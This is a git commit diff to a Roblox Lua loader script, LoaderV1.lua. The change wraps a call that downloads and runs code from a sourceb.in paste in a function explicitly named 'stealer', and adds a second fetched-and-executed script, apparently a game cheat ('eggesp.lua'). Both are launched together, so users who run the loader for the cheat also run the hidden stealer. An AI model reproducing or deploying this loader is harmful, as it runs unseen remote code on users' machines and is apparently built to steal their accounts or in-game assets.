8f873b4a0a40cf6d6cd4b2ec8316e7e29849c2e8
NoLag-id <sfpher6@gmail.com>
2025-07-11 08:07:46 +0800

    Update LoaderV1.lua

--- LoaderV1.lua
+++ LoaderV1.lua
@@ -1,1 +1,9 @@
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/pG96V9Cv31/0", true))()
+local function stealer()
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/pG96V9Cv31/0", true))()
+end
+local function farm()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ryikazu/loader/refs/heads/main/eggesp.lua"))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
